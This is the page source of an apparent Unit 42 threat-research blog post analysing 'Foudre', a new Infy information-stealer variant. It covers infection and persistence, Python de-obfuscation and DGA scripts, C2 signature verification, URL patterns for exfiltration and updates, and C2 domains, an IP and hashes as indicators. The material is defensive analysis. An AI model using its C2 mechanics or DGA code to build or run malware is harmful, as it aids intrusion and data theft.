
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>Prince of Persia – Ride the Lightning: Infy returns as “Foudre”</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-prince-persia-ride-lightning-infy-returns-foudre/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-prince-persia-ride-lightning-infy-returns-foudre/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Prince of Persia – Ride the Lightning: Infy returns as “Foudre”" />
<meta property="og:description" content="Unit 42 resarchers recently observed a new version of the “Infy” malware dubbed “Foudre”." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-prince-persia-ride-lightning-infy-returns-foudre/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="Foudre" />
<meta property="article:tag" content="Infy" />
<meta property="article:tag" content="Prince of Persia" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2017-08-01T02:00:17+00:00" />
<meta property="article:modified_time" content="2018-11-01T10:53:59+00:00" />
<meta property="og:updated_time" content="2018-11-01T10:53:59+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:width" content="650" />
<meta property="og:image:height" content="300" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Unit 42 resarchers recently observed a new version of the “Infy” malware dubbed “Foudre”." />
<meta name="twitter:title" content="Prince of Persia – Ride the Lightning: Infy returns as “Foudre”" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Prince of Persia – Ride the Lightning: Infy returns as “Foudre” Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-prince-persia-ride-lightning-infy-returns-foudre/feed/" />
<meta property="og:likes" content="0"/>
<meta property="og:readtime" content="9"/>
<meta property="og:views" content="18,952"/>
<meta property="og:date_created" content="August 1, 2017 at 5:00 AM"/>
<meta property="og:post_length" content="2909"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Tomer Bar"/>
<meta property="og:author" content="Simon Conant"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/tomer-bar/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/tyler-halfpop/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Prince of Persia \u2013 Ride the Lightning: Infy returns as \u201cFoudre\u201d","name":"Prince of Persia \u2013 Ride the Lightning: Infy returns as \u201cFoudre\u201d","description":"Unit 42 resarchers recently observed a new version of the \u201cInfy\u201d malware dubbed \u201cFoudre\u201d. ","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-prince-persia-ride-lightning-infy-returns-foudre\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-prince-persia-ride-lightning-infy-returns-foudre\/","datePublished":"August 1, 2017","articleBody":"Introduction\nIn February 2017, we observed an evolution of the \u201cInfy\u201d malware that we're calling \"Foudre\" (\"lightning\", in French). The actors appear to have learned from our previous takedown and sinkholing of their Command and Control (C2) infrastructure \u2013 Foudre incorporates new anti-takeover techniques in an attempt to avoid their C2 domains being sinkholed as we did in 2016.\n\nWe documented our original research into the decade-old campaign using the Infy malware in May 2016. A month after publishing that research, we detailed our takeover and sinkholing of the actor\u2019s C2 servers. In July 2016, at Blackhat U.S., Claudio Guarnieri &amp; Collin Anderson presented evidence that a subset of the C2 domains redirecting to our sinkhole were blocked by DNS tampering and HTTP filtering by the Telecommunication Company of Iran (AS12880), preventing Iran-domestic access to our sinkhole.\n\nBelow, we document these changes to the malware, and highlight some ongoing mistakes and how we leveraged them to learn more about this campaign.\nFoudre\nThis new version of Infy uses a window name \u201cFoudre\u201d for keylogging recording (Figure 1).\n\n\n\nFigure 1 \"Foudre\" window for keylogging\n\nThe logic and structure of Foudre is very similar to the original Infy malware. Most of the code remains the original Delphi programming, with an additional crypto library, and a new de-obfuscation algorithm.\nFoudre\u2019s capabilities\nFoudre is, like its Infy predecessors, an information stealer. It includes a keylogger, and captures clipboard contents on a ten-second cycle. It collates system information including process list, installed antivirus, cookies, and other browser data.\n\nThe malware checks for internet connectivity simply by looking for an \u201cHTTP 200\u201d response to a connection to google.com. It includes the ability to check for and download any updates to itself.\n\nThis \u201cimproved Infy\u201d determines the C2 domain name using a Domain Generation Algorithm (DGA). It then validates that the C2 domain is authentic. The C2 returns a signature file, which the malware decrypts and compares it with a locally-stored validation file.\n\nOnce the validity of the C2 is confirmed, stolen data is exfiltrated with a simple HTTP POST.\nInfection\nThe initial infection vector is a classic spear-phishing email, including a self-executable attachment. When clicked, this executable installs an executable loader, a malware DLL, and a decoy readme file (very typical of Infy).\n\nFor first run, the loader calls the DLL with export D1 for setup, creating the installation folder \"%all users%\\app data\\SnailDriver V&lt;version number&gt;\". The loader copies itself as \u201cconfig.exe\u201d, and the DLL with random name (for example \u201cq.d\u201d), to this folder. The version number (for example \u201c1.49\u201d) and DLL name vary between Foudre samples.\n\nThe loader writes itself to autostart in the registry. The DLL is loaded by rundll32.exe only after restarting, when the \u201clp.ini\u201d file in the same folder contains a numeric value.\n\nFoudre uses a similar mechanism as Infy to check if the computer is already infected. It checks for the existence of a specific window \u201cfoudre&lt;trojan version number&gt;\u201d with window class \u201cTNRRDPKE\u201d.\n\nThe final version of the original Infy malware that we observed was 31. We have so far observed Foudre versions 1 and 2 (Figure 2).\n\n\n\nFigure 2 \"Foudre\" version, window exists check mechanism\n\nAlso embedded is the following German text (Figure 3):\n\"Sie soll Auskunft \u00fcber Zsch\u00e4pes Verhalten in der Untersuchungshaft geben - daran d\u00fcrften auch die Opferanw\u00e4lte Interesse haben.\"\nTranslated to English:\n\u201cShe is supposed to provide information about Zschaepe's behavior in the investigative detention period, which should also be of interest for the victims' attorneys.\u201d.\n\n\nFigure 3 Embedded German text\n\nBeate Zsch\u00e4pe is a German right-wing extremist and an alleged member of the Neo-Nazi terror group National Socialist Underground (NSU).\n\nThe text appears to be copied verbatim from the caption to the first photograph in this news article from February 2017: http:\/\/www.sueddeutsche.de\/politik\/nsu-prozess-zschaepes-verteidiger-will-jva-beamtin-als-zeugin-hoeren-1.3379516 (Figure 4).\n\n\n\nFigure 4 Newspaper article source of embedded text\n\nWe saw similar embedded-text snippets in Infy samples, in German, Dutch, and English. It is unclear what the function of this embedded text is.\nString de-obfuscation\n\n\nFigure 5 String De-obfuscation function\n\nThis Python script de-obfuscates a single string:\ndef decrypt(enc_str):\n            index = 0\n            xorKey_mul = 1\n            xorkey = 0\n            dec_str = \"\"\nfor i in range (0,len(enc_str)\/2):\n    \ttwoByte = enc_str[index:index+2]\n   \t index+=2\n \t  xorkey = xorKey_mul &gt;&gt; 8 \n    \ttowByte_hex = ord(twoByte.decode('hex'))\n    \tdec_byte = towByte_hex ^ xorkey\n   \t dec_str+=chr(dec_byte)\n \t   towByte_hex+= xorKey_mul\n \t   xorKey_mul=xorKey_mul*towByte_hex\n  \t  xorKey_mul= xorKey_mul &amp; 0xffff\n return dec_str\nThis IDA Python script adds comments to IDA with all clear text strings:\nimport os,sys\ndef find_function_arg(addr):\n  while True:\n    addr = idc.PrevHead(addr)\n    if GetMnem(addr) == \"mov\" and \"eax\" in GetOpnd(addr, 0):\n      return GetOperandValue(addr, 1)\n  return \"\"\n \ndef get_string(addr):\n  out = \"\"\n  i = 200\n  cnt=0\n  while Byte(addr)&gt; 0 or Byte(addr+1)&gt;0:\n    if Byte(addr) != 0:   \n      out += chr(Byte(addr))\n    addr += 1\n    cnt+=1\n    if cnt==i:\n        return None\n  return out\n \nprint \"[*] Attempting to decrypt strings in malware: \"\nfor x in XrefsTo(0x009F5410, flags=0):\n    ref = find_function_arg(x.frm)\n    string = get_string(ref)\n    if string is not None:\n        dec = decrypt(string)\n        print \"Ref Addr: 0x%x | Decrypted: %s\" % (x.frm, dec)\n    else:\n        print \"Ref Addr: 0x%x is None\" % (x.frm)\n    MakeComm(x.frm, dec)\n    MakeComm(ref, dec)\nC2 Defense\nLearning from our takedown of the actor\u2019s previous C2 infrastructure, this version implements two new C2 mechanisms in an attempt to avoid C2 takeover.\n\nThey are now using DGA for C2 domains. They have also implemented an RSA signature verifying algorithm to check the veracity of a C2 domain.\nDomain Generation Algorithm\nThe domain name is calculated using this algorithm:\nToHex(CRC32(\"NRV1\" + year + month + week_number)) + \t(\".space\"|\".net\"|\".top\")[\n(Thanks to Palo Alto Networks researcher Esmid idrizovic for reversing this). The following script can be used to generate domain names using this algorithm:\nimport binascii\nimport datetime\n\ndef getHostCRC(input):\n    crc = binascii.crc32(input) &amp; 0xffffffff\n    host = \"{:08x}\".format(int(crc))\n    return host\ndef getDomains(date):\n    domains = [\".space\"]\n    results = []\n    weeknumber = date.isocalendar()[1]\n    s = \"NRV1{}{}{}\".format(date.year, date.month, weeknumber)\n    hostname = s\n    host = getHostCRC(hostname) + domains[0]\n    results.append(host)\n    for d in domains:\n        for i in range(1, 101):\n            hostname = s + str(i)\n            host = getHostCRC(hostname) + d\n            results.append(host)\n    return results\n\ngetDomainsForNextWeeks(number_of_weeks):\n    date = datetime.datetime.now()\n    date -= datetime.timedelta(days=7)\n    n = 1\n    date_to = date + datetime.timedelta(days=7*number_of_weeks)\n    print \"Generating domains for: {} - {}.\\nEach domain can have .space, .net or .top as TLD (top level domain).\\n\\n\".format(date, date_to)\n\n    for i in range(number_of_weeks):\n        tmp = getDomains(date)\n        top_domains = tmp[:20]\n        weeknumber = date.isocalendar()[1]\n        print \"{}. {} - Week Number: {}\".format(n, date, weeknumber)\n        for domain in top_domains:\n            print \"{}\".format(domain)\n        date += datetime.timedelta(days=7)\n        n = n + 1\n        print \"\"\ngetDomainsForNextWeeks(10)[\n\n\nFigure 6 CRC32 code in the DGA algorithm\n\nPrevious and current C2 domains are detailed in Appendix I. All point at the same C2 server on 198.252.108[.]158, located in Canada, using DNS servers ns1.2daa46f1[.]space and ns2.2daa46f1[.]space.\n\nThe DNS RNAME is henry55.iname[.]com, though we were not able to find any other reference to this email address outside of the context of this campaign.\nC2 signature verification\nFoudre uses the lockbox3 Delphi library to verify the C2:\n\n \tDownload signature file from the generated domain name C2 with GET request:\nGET \/de\/?d=2017149&amp;t=2017%2D5%2D29%2D%2D12%2D16%2D33\nd= {year}{number of days since the beginning of the year}\nt = Current time, urlencoded.\n \tSave the signature in %appdata%\\sig.tmp.\n \tWrite the clear text string\n{domainname}{year}{number of days since the beginning of the year}\nin %appdata%\\dom.tmp.\nThe current date is downloaded from http:\/\/feeds.skynews[.]com\/feeds\/rss\/home.xml &lt;lastBuildDate&gt; field.\n \tDecrypt the signature file with the public key (stored in %all users%\\application data\\snailDriver V&lt;version&gt;\\pub.key)\n \tCompare the result with the dom.tmp clear text string.\n\n\n\nFigure 7 Download Signature Verification\n\nAfter the domain is verified, it checks if a new trojan update version is needed with these posts:\n\n&nbsp;\nhttp:\/\/&lt;C2domain&gt;\/2014\/?c=&lt;computername&gt;&amp;u=&lt;username&gt;&amp;v=&lt;version&gt;&amp;s=&lt;password&gt;&amp;f=&lt;folder&gt;&amp;mi=&lt;machineguid_urlencoded&gt;&amp;b=&lt;32\/64bit&gt;&amp;t=&lt;time_urlencoded&gt;\nhttp:\/\/&lt;C2domain&gt;\/2015\/?c=&lt;computername&gt;&amp;u=&lt;username&gt;&amp;v=&lt;version&gt;&amp;s=&lt;password&gt;&amp;f=&lt;folder&gt;&amp;mi=&lt;machineguid_urlencoded&gt;&amp;b=&lt;32\/64bit&gt;&amp;t=&lt;time_urlencoded&gt;\nThe first request (2014 folder) downloads any new trojan version to %temp%\\gtsdch32.tmp. The second request (2015 folder) downloads a second signature file to %temp%\\gtsdci32.tmp.\n\nThe malware then performs a second RSA signature verification using the public key. If the verification is successful, the new trojan version (gtsdch32.tmp) is executed with this command line:\ngtsdch32.tmp -sp\/set -pRBA4b5a98Q\nWe observed a very similar command structure in the original Infy malware:\n\"sp\/ins -pBA5a88E\".\n\nOne of the update parameters (download and execute) contains references indicating that there is also a 64bit version of Foudre.\n\nWe also found that the request &lt;C2&gt;\/f\/?d=&lt;filename&gt; is redirected to &lt;C2&gt;\/f\/&lt;filename&gt;.tmp. This parameter is not supported by the agent, so it is likely a server-side redirection used by the update mechanism.\n\nThe malware then encrypts the keylogger data and system information, and sends to the C2 with this post:\nhttp:\/\/&lt;C2&gt;\/en\/d=&lt;date&gt;,text=&lt;data&gt;\n\nMapping the victims\nWe forecast one of the DGA domain names and registered it before the adversary.\n\nThe victims attempted to connect to a C2 on that domain, but without the RSA private key we could not verify our domain to them. However, we are able to map the victim locations using GeoIP (Figure 8).\n\nWe note a preponderance of Iranian-domestic victims, very reminiscent of the Infy campaigns. Efforts against the United States and Iraq are also familiar. And once again, the very small number of targets hints at a non-financial motivation.\n\nOne of the Iraq victims uses an IP in the same class C network as one of an observed Infy victim, suggesting that the adversary is targeting the same specific organization, or even computer.\n\n\n\nFigure 8 Geographic spread of victims\n\nAlthough without the RSA private key, we were unable to establish communications with any victims, we discovered that by sending an invalid signature file to the victim, owing to a lack of input validation of the signature file content\/size, we can crash the rundll32 process running the Foudre malicious DLL, disabling the infection until the victim reboots.\nConclusion\nIn our Prince of Persia blog, we noted that this campaign had been active for at least a decade. We followed up with our Prince of Persia: Game Over blog, documenting our takedown and sinkholing of the adversary\u2019s C2 infrastructure.\n\nRegarding the actions by the Telecommunication Company of Iran to prevent the C2s from resolving to our sinkhole,\u00a0 Guarnieri &amp; Anderson note \u201cThe filtering policy indicates that Iranian authorities had specifically intervened to block access to the command and control domains of a state \u00adaligned intrusion campaign at a country level\u201d.\n\nWe shouldn\u2019t be surprised then to see Infy return \u2013 fundamentally the same malware, targeting the same victims.\n\nThe actors understand that they needed a more robust C2 infrastructure to prevent infiltration and takedown. DGA adds some resilience, but is not impervious to takeover.\n\nHowever, using digital signing is an effective C2 defense mechanism. Without access to the private keys, it\u2019s not possible to impersonate a C2 even if a DGA domain is registered by a researcher. It\u2019s possible that the private keys are held locally on the C2 server, but without access to the C2 we can\u2019t confirm this particular potential vulnerability in their infrastructure.\n\nPrince of Persia is persistent, indeed.\nCoverage\nPalo Alto Networks customers are protected from this threat in the following ways:\n\n \tWildFire accurately identifies all malware samples related to this operation as malicious.\n \tTraps prevents this threat on endpoints, based upon WildFire prevention.\n \tDomains used by this operation have been flagged as malicious in Threat Prevention.\n\nAutoFocus users can view malware related to this attack using the \u201cFoudre\u201d tag.\n\nIOCs can be found in the appendices of this report.\nAppendix I \u2013 C2 infrastructure IoCs\nAs of time of publishing, the actor had registered DGA domains corresponding to dates through end-July 2017. Although the DGA algorithm allows the Top-Level Domains (TLDs) of \u201c.space\u201d, \u201d.net\u201d and \u201c.top\u201d, we note predominantly \u201c.space\u201d domain registrations, just one \u201c.top\u201d, and no \u201c.net\u201d. Of special interest is multiple \u201c.site\u201d domains resolving to the C2 IP address. We suspect that this may be different malware \u2013 possibly, as we saw with the previous Prince of Persia investigations, an as-yet unidentified more full-featured Infy\/Foudre variant.\n\nns1.2daa46f1[.]space\n\nns2.2daa46f1[.]space\n\n017eab31[.]space\n\n01ead12b[.]space\n\n0ca0453a[.]site\n\n14c7e2dc[.]space\n\n15bb747b[.]site\n\n15ce27c5[.]site\n\n16e53040[.]space\n\n17ecf559[.]site\n\n1cb3c4c0[.]space\n\n1d4ee030[.]space\n\n23dafa1e[.]space\n\n2daa46f1[.]space\n\n341a436d[.]space\n\n3828b6ed[.]site\n\n39451f31[.]space\n\n3a6e08b4[.]site\n\n3c6e6571[.]space\n\n3e8718c3[.]site\n\n3f4572f4[.]site\n\n431d73fb[.]space\n\n43ec206d[.]top\n\n4b6955e7[.]space\n\n4e422fa7[.]space\n\n4f2f867b[.]site\n\n5aad7667[.]space\n\n60ebc5cf[.]site\n\n61e200d6[.]space\n\n62c91753[.]site\n\n63c0d24a[.]space\n\n6bb4f456[.]space\n\n76ede1bd[.]space\n\n7ba775ac[.]site\n\n8447b18a[.]space\n\n869182ff[.]site\n\n884efdfb[.]space\n\n8cc7767f[.]site\n\n8dceb366[.]space\n\n8ee5a4e3[.]site\n\n8fec61fa[.]space\n\n9155ccba[.]space\n\n9877fa8b[.]space\n\n98e38091[.]space\n\n9c1f58ab[.]site\n\n9f233843[.]space\n\na20af0d2[.]space\n\na367590e[.]site\n\na4a55efc[.]space\n\na64c234e[.]site\n\nb4a3174b[.]space\n\nc4c9e3c4[.]space\n\nc5aeee9c[.]site\n\nd14b13d8[.]site\n\nd260045d[.]space\n\nd3a26e6a[.]space\n\nd4606998[.]site\n\nd50dc044[.]space\n\nd74b7e1d[.]space\n\ne00dc810[.]space\n\ne652fc2c[.]space\n\neb18683d[.]site\n\nf196b269[.]site\n\nf8eb516c[.]space\n\nf9e29475[.]site\n\nfac983f0[.]space\n\nfbc046e9[.]site\n\n198.252.108[.]158 Hawkhost Canada \u2013 Dedicated hosting (all current resolutions malicious).\n\nNote that we identified several other IP addresses historically related to some of these domains, but research concludes that these are registrar-default hosts rather than C2 servers.\nAppendix II \u2013 Hashes\n2b37ce9e31625d8b9e51b88418d4bf38ed28c77d98ca59a09daab01be36d405a\n4d51a0ea4ecc62456295873ff135e4d94d5899c4de749621bafcedbf4417c472\n7ce2c5111e3560aa6036f98b48ceafe83aa1ac3d3b33392835316c859970f8bc\n7e73a727dc8f3c48e58468c3fd0a193a027d085f25fa274a6e187cf503f01f74\nda228831089c56743d1fbc8ef156c672017cdf46a322d847a270b9907def53a5\n6bc9f6ac2f6688ed63baa29913eaf8c64738cf19933d974d25a0c26b7d01b9ac\n7c6206eaf0c5c9c6c8d8586a626b49575942572c51458575e51cba72ba2096a4\ndb605d501d3a5ca2b0e3d8296d552fbbf048ee831be21efca407c45bf794b109\nAppendix III \u2013 RSA signature verifying\nReplicating the malicious c2 server domain 39451f31[.]space:\n\ndom file:\n\n39451f31.space2017138\n\nsig file:\n\n089EABE330EFD99602C164E889B44E16B8284BB1834A29F16C4BE8CE52FF507F9592E541DBEF85F3C15312583057CB1151B4027C22FB9A776CA112E4922D9BEB03D6682393350C9CE3BAABD92F02D620D81CCF38430AB340B048BE230240AACDB93F7AC8B96BFEDF68B8D2964558E6B9BC5E6BC361A876B71FB54A45CFA9E327B335CEDF34DB904E70CBBD1C5468411AC0677956156643209649D6551427652FC7C8487490D69CEE5DAB6B8B46764214B21E5B8E9AF866AF95CB883523B534412E07D25A956438DC249F15AEB7238CDC87A1B3BB020A096A8BCC9F4CED0554470DCA45638382C24BD2F37767D0546A6C57E8D27679CD1C332AE744A1FDBBB771\n\npublic key\n\n4E0A4C6F636B426F783301000000030001000015DEAED84DB7C292D7DEB01D5EB8DBE40A289736E9050B60E11DF90AAEEA6D1504D1D5056A50D1C44E3E03A8294E226C947D667B491896C151D5BEF32931636881ED635ACBDF18F8ED48BC680FFA31D60CAAF4EFAB772737081A6BD6B3D6D74DC57394095B340F492BE9E11115E67B1EF6B278ABA92055EB68D5138FF64CD9C3433DD8A4EA5A9EE3BAF0BF9D2A334CA6979941E676C13B3DE015D68070E43E8D6442CA677AA53E3CF27FB1957B7AFA03044BDB143726EBB4BE27CCEAD5AF89E966E646B43913EF873C08B488B6D5140914869A133379B9753B5E046E462D18DB692EA3A263F3694AF37DDC388737581F12701BF75061940877C886F05AB9237B030000000100014E0A4C6F636B426F7833010000000300010000E915DED8174C9B15D81DA2BA072DD858F9641B294BEB78A98E88AFC4A060161B16BBA30881F50E33B8552A449ECCAB8917F4E07359E70D5D19272026A486DB1F39E73903422F0ECB072DACB7B71955726301D25E50507524A6AB50C4C60718F32A2F546AE764B149E271A52CFBD2A60F3795588A6436DC08F881B931130A0444F2F2A30C74CA24A1F153F6012E46FA5047355114E3BD67FC3E32A1CE6711460C96D2470D787E8DDAF9F12C58A8A1264B27917A7F13F19B6B7D3347D40A486EB68FDA1653A5808B9380026B1B4B6AF640F7C8ECAF9A5FD77E571494D7152038545B7E53704A14CFED581BBC579DDF542247F110CAF70194ADBDB114314EE4716303000000010001\n\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/unit42-web-banner-650x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Tomer Bar"},{"@type":"Person","name":"Simon Conant"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"38809","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=38809' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-prince-persia-ride-lightning-infy-returns-foudre%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-prince-persia-ride-lightning-infy-returns-foudre%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-38809 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
